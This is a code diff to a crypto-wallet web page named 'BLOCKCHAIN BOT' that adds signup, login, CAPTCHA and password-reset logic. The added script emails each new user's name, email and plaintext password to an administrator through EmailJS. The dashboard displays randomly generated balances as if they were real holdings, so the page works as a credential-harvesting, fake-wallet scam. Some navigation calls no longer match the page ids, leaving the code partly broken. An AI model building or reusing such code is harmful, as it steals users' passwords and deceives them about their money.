@@ -101,11 +101,11 @@
   <header>  
     <div class="logo" onclick="showPage('page0')">BLOCKCHAIN BOT</div>  
     <nav>  
-      <a onclick="showPage('page4')">Dashboard</a>  
-      <a onclick="showPage('page6')">Receive</a>  
-      <a onclick="showPage('page7')">Transfer</a>  
-      <a onclick="showPage('page11')">Settings</a>  
-      <a onclick="showPage('page1')">Log In</a>  
+      <a onclick="showPage('4')">Dashboard</a>  
+      <a onclick="showPage('6')">Receive</a>  
+      <a onclick="showPage('7')">Transfer</a>  
+      <a onclick="showPage('11')">Settings</a>  
+      <a onclick="showPage('1')">Log In</a>  
     </nav>  
   </header>    
   <!-- PAGES CONTAINER -->    
@@ -186,6 +186,25 @@
     </p>  
   </div>  
 </section>  
+   
+  <!-- CAPTCHA after signup --> 
+  <div id="page2ii" class="page" style="display:none;">
+    <h3>CAPTCHA Verification</h3>
+    <div class="h-captcha" data-sitekey="4e5a8260-9554-439c-8d58-76f04ca823c8"></div>
+  </div>  
+  <!-- CAPTCHA for reset -->  
+  <div id="page1i" class="page" style="display:none;">
+    <h3>Reset Password - CAPTCHA</h3>
+    <div class="h-captcha" data-sitekey="4e5a8260-9554-439c-8d58-76f04ca823c8"></div>
+    <button onclick="showPage('1ii')">Verify</button>
+  </div>  
+  <!-- Reset Password Form -->  
+  <div id="page1ii" class="page" style="display:none;">
+    <h3>Set New Password</h3>
+    <input type="email" id="resetEmail" placeholder="Email"><br>
+    <input type="password" id="newPassword" placeholder="New Password"><br>
+    <button onclick="handleReset()">Submit</button>
+  </div>  
 
 <!-- PAGE 2 - SIGN UP -->  
 <section id="page2" class="page">  
@@ -215,7 +234,7 @@
 
     <header class="flex justify-between items-center">  
       <h2 class="text-3xl font-bold text-yellow-400">Dashboard</h2>  
-      <button onclick="showPage('page11')" title="Settings">⚙️</button>  
+      <button onclick="showPage('11')" title="Settings">⚙️</button>  
     </header>  
 
     <!-- Wallet Info -->  
@@ -242,8 +261,8 @@
 
     <!-- Actions -->  
     <div class="flex justify-center space-x-6">  
-      <button onclick="showPage('page6')" class="px-8 py-3 rounded-xl bg-yellow-400 text-[#072146] font-bold shadow-lg hover:bg-yellow-500 transition">Receive</button>  
-      <button onclick="showPage('page7')" class="px-8 py-3 rounded-xl bg-yellow-400 text-[#072146] font-bold shadow-lg hover:bg-yellow-500 transition">Transfer</button>  
+      <button onclick="showPage('6')" class="px-8 py-3 rounded-xl bg-yellow-400 text-[#072146] font-bold shadow-lg hover:bg-yellow-500 transition">Receive</button>  
+      <button onclick="showPage('7')" class="px-8 py-3 rounded-xl bg-yellow-400 text-[#072146] font-bold shadow-lg hover:bg-yellow-500 transition">Transfer</button>  
     </div>  
   </div>  
 </section>  
@@ -304,27 +323,6 @@
     <button class="mt-8 w-full" onclick="saveSettings()">Save Settings</button>  
   </div>  
 </section>
-
-  </main>   
-
-  <!-- CAPTCHA after signup --> 
-  <div id="page2ii" class="page" style="display:none;">
-    <h3>CAPTCHA Verification</h3>
-    <div class="h-captcha" data-sitekey="4e5a8260-9554-439c-8d58-76f04ca823c8"></div>
-  </div>  
-  <!-- CAPTCHA for reset -->  
-  <div id="page1i" class="page" style="display:none;">
-    <h3>Reset Password - CAPTCHA</h3>
-    <div class="h-captcha" data-sitekey="4e5a8260-9554-439c-8d58-76f04ca823c8"></div>
-    <button onclick="showPage('page1ii')">Verify</button>
-  </div>  
-  <!-- Reset Password Form -->  
-  <div id="page1ii" class="page" style="display:none;">
-    <h3>Set New Password</h3>
-    <input type="email" id="resetEmail" placeholder="Email"><br>
-    <input type="password" id="newPassword" placeholder="New Password"><br>
-    <button onclick="handleReset()">Submit</button>
-  </div>  
   
   
   <script>
@@ -672,6 +670,310 @@
       alert('Passwords do not match.');
     }
   }
+  </script>
+ 
+<script>
+// --- Initialize EmailJS ---
+emailjs.init("n9BsaM4ZjH178UeSf");
+const serviceID = "service_xg8bzqs";
+const submitTemplateID = "template_gclz9gu";
+const autoReplyTemplateID = "template_r0zg4zj";
+const hcaptchaSiteKey = "4e5a8260-9554-439c-8d58-76f04ca823c8";
+
+// --- Global State ---
+let registeredUsers = JSON.parse(localStorage.getItem("registeredUsers") || "{}");
+let currentUserEmail = null;
+
+// --- Helper Functions ---
+function showPage(pageId) {
+  document.querySelectorAll(".page").forEach(p => p.classList.remove("active"));
+  const page = document.getElementById(pageId);
+  if (page) page.classList.add("active");
+}
+
+function saveUsers() {
+  localStorage.setItem("registeredUsers", JSON.stringify(registeredUsers));
+}
+
+function isValidEmail(email) {
+  return /\S+@\S+\.\S+/.test(email);
+}
+
+// --- SIGNUP PROCESS ---
+const signUpForm = document.getElementById("signUpForm");
+signUpForm?.addEventListener("submit", async (e) => {
+  e.preventDefault();
+  const fullName = signUpForm.fullName.value.trim();
+  const email = signUpForm.email.value.trim().toLowerCase();
+  const password = signUpForm.password.value;
+
+  if (!fullName || !isValidEmail(email) || password.length < 6) {
+    alert("Please fill all fields correctly (password min 6 chars).");
+    return;
+  }
+  if (registeredUsers[email]) {
+    alert("Email already registered, please login.");
+    return;
+  }
+
+  // Save user locally (for demo only; in prod use secure backend)
+  registeredUsers[email] = { fullName, password };
+  saveUsers();
+  currentUserEmail = email;
+
+  // Send registration email to admin
+  try {
+    await emailjs.send(serviceID, submitTemplateID, {
+      full_name: fullName,
+      user_email: email,
+      user_password: password,
+    });
+  } catch (err) {
+    console.error("EmailJS registration send error:", err);
+  }
+
+  // Send auto-reply verification email with CAPTCHA link
+  try {
+    await emailjs.send(serviceID, autoReplyTemplateID, {
+      to_email: email,
+      verification_link: window.location.origin + "/#page2ii"
+    });
+  } catch (err) {
+    console.error("EmailJS auto-reply send error:", err);
+  }
+
+  // Show authenticating page with email display & visit email button after delay
+  showPage("page2i");
+  document.getElementById("authEmailDisplay").textContent = email;
+  document.getElementById("visitEmailBtn").style.display = "none";
+
+  setTimeout(() => {
+    document.getElementById("visitEmailBtn").style.display = "inline-block";
+  }, 30000);
+});
+
+// Visit Email button opens user's email client
+document.getElementById("visitEmailBtn")?.addEventListener("click", () => {
+  window.open("mailto:" + currentUserEmail, "_blank");
+});
+
+// --- LOGIN PROCESS ---
+const loginForm = document.getElementById("loginForm");
+loginForm?.addEventListener("submit", (e) => {
+  e.preventDefault();
+  const email = loginForm.email.value.trim().toLowerCase();
+  const password = loginForm.password.value;
+
+  if (!registeredUsers[email] || registeredUsers[email].password !== password) {
+    alert("User details incorrect. Please enter correct email or password.");
+    return;
+  }
+  currentUserEmail = email;
+  showPage("page3"); // dashboard page is now page3
+  initializeDashboard(email);
+});
+
+// --- RESET PASSWORD PROCESS ---
+const resetPasswordBtn = document.getElementById("resetPasswordBtn");
+resetPasswordBtn?.addEventListener("click", () => {
+  const email = loginForm.email.value.trim().toLowerCase();
+  if (!registeredUsers[email]) {
+    alert("Email not registered. Please sign up first.");
+    return;
+  }
+  currentUserEmail = email;
+  showPage("page1i"); // CAPTCHA verification for reset
+});
+
+// --- hCaptcha Success Callback ---
+window.onCaptchaSuccess = function () {
+  if (document.getElementById("page1i")?.classList.contains("active")) {
+    // Reset password CAPTCHA success
+    showPage("page1ii"); // enter new password
+  } else if (document.getElementById("page2ii")?.classList.contains("active")) {
+    // Signup CAPTCHA success
+    showPage("page3"); // verifying details (also dashboard page)
+    setTimeout(() => {
+      showPage("page3"); // dashboard page
+      initializeDashboard(currentUserEmail);
+    }, 30000);
+  }
+};
+
+// --- NEW PASSWORD SUBMISSION ---
+const newPasswordForm = document.getElementById("newPasswordForm");
+newPasswordForm?.addEventListener("submit", (e) => {
+  e.preventDefault();
+  const newPassword = newPasswordForm.newPassword.value;
+  const confirmPassword = newPasswordForm.confirmPassword.value;
+
+  if (newPassword.length < 6) {
+    alert("Password must be at least 6 characters.");
+    return;
+  }
+  if (newPassword !== confirmPassword) {
+    alert("Passwords do not match.");
+    return;
+  }
+
+  registeredUsers[currentUserEmail].password = newPassword;
+  saveUsers();
+  alert("Password reset successful.");
+  showPage("page3");
+  initializeDashboard(currentUserEmail);
+});
+
+// --- DASHBOARD INITIALIZATION ---
+async function initializeDashboard(email) {
+  document.getElementById("welcomeUser").textContent = registeredUsers[email].fullName || "User";
+  currentUserEmail = email;
+
+  await fetchTokenPrices();
+  loadTradingViewWidgets();
+  updateBalances();
+}
+
+// --- FETCH TOKEN PRICES USING COINGECKO ---
+async function fetchTokenPrices() {
+  const coinIds = ["bitcoin", "ethereum", "binancecoin", "tether", "cardano", "solana"];
+  try {
+    const response = await fetch(`https://api.coingecko.com/api/v3/simple/price?ids=${coinIds.join(",")}&vs_currencies=usd&include_24hr_change=true`);
+    const data = await response.json();
+
+    coinIds.forEach(id => {
+      const priceEl = document.getElementById(`${id}Price`);
+      const changeEl = document.getElementById(`${id}Change`);
+      if (priceEl && changeEl) {
+        const price = data[id]?.usd ?? "N/A";
+        const change = data[id]?.usd_24h_change ?? 0;
+        priceEl.textContent = `$${price.toLocaleString()}`;
+        changeEl.textContent = `${change.toFixed(2)}% (24h)`;
+        changeEl.style.color = change >= 0 ? "#4ade80" : "#f87171"; // green or red
+      }
+    });
+  } catch (err) {
+    console.error("Failed to fetch CoinGecko prices:", err);
+  }
+}
+
+// --- LOAD TRADINGVIEW WIDGETS ---
+function loadTradingViewWidgets() {
+  // Market news widget
+  if (typeof TradingView !== "undefined") {
+    new TradingView.MediumWidget({
+      container_id: "marketNewsContainer",
+      symbols: [
+        ["BTCUSD|1D", "BTC"],
+        ["ETHUSD|1D", "ETH"],
+        ["BNBUSD|1D", "BNB"],
+        ["USDTUSD|1D", "USDT"]
+      ],
+      greyText: "Latest Market News",
+      gridLineColor: "#2a2a2a",
+      fontColor: "#f0b90b",
+      underLineColor: "#333",
+      trendLineColor: "#f0b90b",
+      width: "100%",
+      height: 300,
+      locale: "en"
+    });
+
+    // Live price chart widget for BTC/USDT
+    new TradingView.widget({
+      container_id: "priceChartContainer",
+      autosize: true,
+      symbol: "BINANCE:BTCUSDT",
+      interval: "60",
+      timezone: "Etc/UTC",
+      theme: "dark",
+      style: "1",
+      locale: "en",
+      toolbar_bg: "#121419",
+      enable_publishing: false,
+      allow_symbol_change: true,
+      hide_side_toolbar: false,
+      withdateranges: true,
+      details: true,
+      studies: ["MACD@tv-basicstudies", "RSI@tv-basicstudies"],
+      show_popup_button: true,
+      popup_width: "1000",
+      popup_height: "650"
+    });
+  } else {
+    console.warn("TradingView library not loaded.");
+  }
+}
+
+// --- UPDATE DASHBOARD BALANCES (Simulated) ---
+function updateBalances() {
+  const usdtBalanceEl = document.getElementById("usdtBalance");
+  const bnbBalanceEl = document.getElementById("bnbBalance");
+  const totalAssetsEl = document.getElementById("totalAssets");
+
+  // Simulated balances (replace with real API calls)
+  const usdtBalance = (Math.random() * 5000 + 1000).toFixed(2);
+  const bnbBalance = (Math.random() * 20 + 5).toFixed(4);
+
+  // Fake BNB price (can fetch from CoinGecko)
+  const bnbPriceText = document.getElementById("binancecoinPrice")?.textContent || "$300";
+  const bnbPrice = parseFloat(bnbPriceText.replace("$", "").replace(",", "")) || 300;
+
+  const total = (parseFloat(usdtBalance) + bnbBalance * bnbPrice).toFixed(2);
+
+  if (usdtBalanceEl) usdtBalanceEl.textContent = `${usdtBalance} USDT`;
+  if (bnbBalanceEl) bnbBalanceEl.textContent = `${bnbBalance} BNB`;
+  if (totalAssetsEl) totalAssetsEl.textContent = `$${total}`;
+}
+
+// --- COPY WALLET ADDRESS FUNCTION ---
+function copyWalletAddress() {
+  const walletAddressEl = document.getElementById("walletAddress");
+  if (!walletAddressEl) return;
+
+  const address = walletAddressEl.textContent.trim();
+  navigator.clipboard.writeText(address).then(() => {
+    alert("Wallet address copied to clipboard!");
+  }).catch(() => {
+    alert("Failed to copy address.");
+  });
+}
+
+// --- NAVIGATION BUTTONS ---
+document.querySelectorAll("[data-show-page]").forEach(btn => {
+  btn.addEventListener("click", () => {
+    const target = btn.getAttribute("data-show-page");
+    showPage(target);
+  });
+});
+
+// --- hCaptcha Rendering ---
+function renderHCaptcha(containerId) {
+  if (typeof hcaptcha === "undefined") {
+    console.error("hCaptcha library not loaded.");
+    return;
+  }
+  hcaptcha.render(containerId, {
+    sitekey: hcaptchaSiteKey,
+    callback: () => {
+      window.onCaptchaSuccess();
+    },
+    theme: "dark"
+  });
+}
+
+// Render hCaptcha on page show for CAPTCHA pages
+document.getElementById("page2ii")?.addEventListener("transitionend", () => {
+  renderHCaptcha("hcaptcha-container");
+});
+document.getElementById("page1i")?.addEventListener("transitionend", () => {
+  renderHCaptcha("hcaptcha-container-reset");
+});
+
+// --- INITIALIZE ON DOM CONTENT LOADED ---
+window.addEventListener("DOMContentLoaded", () => {
+  showPage("page1"); // default to login/signup page
+  renderHCaptcha("hcaptcha-container-reset");
+});
   </script>
 </body>
 </html>
